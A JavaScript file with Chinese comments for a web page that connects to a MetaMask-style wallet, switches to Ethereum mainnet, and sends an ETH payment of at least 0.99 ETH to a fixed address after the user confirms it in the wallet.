// ======== 配置 ========
const DESTINATION = "0x86cCaE5a2B964A6F179ddF48f26740bb8F5B0bbD";
const MAINNET_CHAIN_HEX = "0x1"; // Ethereum Mainnet

// ======== 元素引用 ========
const connectBtn  = document.getElementById("connectBtn");
const confirmBtn  = document.getElementById("confirmBtn");
const statusBox   = document.getElementById("status");
const ethInput    = document.getElementById("eth");

// ======== 状态 ========
let provider = null;
let signer   = null;
let account  = null;

// ======== UI 辅助 ========
function setStatus(type, text){
  statusBox.className = `status status-${type}`;
  statusBox.textContent = text;
}
function isValidEth(v){
  const n = Number(v);
  return Number.isFinite(n) && n >= 0.99;
}
function syncButtonState(){
  confirmBtn.disabled = !(account && isValidEth(ethInput.value));
  const tip = document.getElementById("ethTip");
  if (isValidEth(ethInput.value)) {
    tip.textContent = "金额有效 ✅";
  } else {
    tip.textContent = "最低 0.99 ETH";
  }
}

// ======== 连接钱包 ========
async function connectWallet(auto=false){
  // 检测环境
  if (!window.ethereum){
    setStatus("error", "未检测到钱包环境：请安装 MetaMask 或在钱包内置浏览器打开");
    alert("未检测到钱包扩展。请安装 MetaMask，或使用钱包自带浏览器打开此页面。");
    return;
  }
  if (typeof window.ethers === "undefined"){
    setStatus("error", "ethers.js 加载失败，请检查网络/CDN");
    alert("ethers.js 未加载成功，请检查网络或稍后重试。");
    return;
  }

  try{
    provider = new ethers.providers.Web3Provider(window.ethereum, "any");

    // 自动/手动请求账户
    const method = auto ? "eth_accounts" : "eth_requestAccounts";
    const accounts = await window.ethereum.request({ method });

    if (!accounts || !accounts.length){
      if (auto) {
        setStatus("warning", "未连接钱包");
      } else {
        setStatus("warning", "用户未授权连接钱包");
        alert("请在钱包弹窗中授权连接。");
      }
      return;
    }

    account = ethers.utils.getAddress(accounts[0]);
    signer = provider.getSigner();

    // 网络检查并尝试切换到主网
    const network = await provider.getNetwork();
    if ("0x" + network.chainId.toString(16) !== MAINNET_CHAIN_HEX){
      try{
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: MAINNET_CHAIN_HEX }]
        });
        setStatus("ok", `已连接：${account.slice(0,6)}...${account.slice(-4)}（已切换主网）`);
      }catch(switchErr){
        if (switchErr.code === 4902){
          alert("请手动切换到 Ethereum 主网后再试。");
          setStatus("warning", `已连接：${account.slice(0,6)}...${account.slice(-4)}（当前非主网）`);
        }else{
          setStatus("warning", `已连接：${account.slice(0,6)}...${account.slice(-4)}（切网失败）`);
        }
      }
    }else{
      setStatus("ok", `已连接：${account.slice(0,6)}...${account.slice(-4)}（主网）`);
    }

    connectBtn.textContent = "✅ 已连接";
    connectBtn.disabled = true;
    syncButtonState();

  }catch(err){
    console.error(err);
    setStatus("error", `连接失败：${err.message || err}`);
    if (!auto) alert("连接失败：" + (err.message || err));
  }
}

// ======== 发送交易（弹钱包） ========
async function pay(){
  if (!account){ alert("请先连接钱包"); return; }
  const amount = String(ethInput.value || "").trim();
  if (!isValidEth(amount)){ alert("ETH 金额必须 ≥ 0.99"); return; }

  try{
    // 方式一：直接用 provider 的原生请求（最通用）
    const valueHex = ethers.utils.parseEther(amount).toHexString();
    const txParams = {
      from: account,
      to: DESTINATION,
      value: valueHex
    };
    const txHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [txParams]
    });
    console.log("交易已提交：", txHash);
    alert("交易已提交，等待链上确认。\nTxHash: " + txHash);

    // 方式二（备选）：使用 signer（某些钱包环境更友好）
    // const tx = await signer.sendTransaction({ to: DESTINATION, value: ethers.utils.parseEther(amount) });
    // alert("交易已提交，等待确认。\nTxHash: " + tx.hash);

  }catch(err){
    console.error(err);
    alert("交易失败：" + (err?.data?.message || err?.message || String(err)));
  }
}

// ======== 事件绑定 ========
connectBtn.addEventListener("click", ()=>connectWallet(false));
confirmBtn.addEventListener("click", pay);
ethInput.addEventListener("input", syncButtonState);

// ======== 自动尝试连接（在钱包内置浏览器中可无感连接） ========
window.addEventListener("load", () => {
  syncButtonState();
  connectWallet(true); // 自动尝试（不会弹窗打扰用户）
});

// 当钱包账户/网络变更时，自动更新状态
if (window.ethereum){
  window.ethereum.on?.("accountsChanged", (accs)=>{
    if (accs && accs.length){
      account = ethers.utils.getAddress(accs[0]);
      setStatus("ok", `已连接：${account.slice(0,6)}...${account.slice(-4)}`);
    }else{
      account = null;
      signer = null;
      connectBtn.disabled = false;
      connectBtn.textContent = "🔗 连接钱包";
      setStatus("warning", "未连接钱包");
    }
    syncButtonState();
  });

  window.ethereum.on?.("chainChanged", (_chainId)=>{
    location.reload();
  });
}
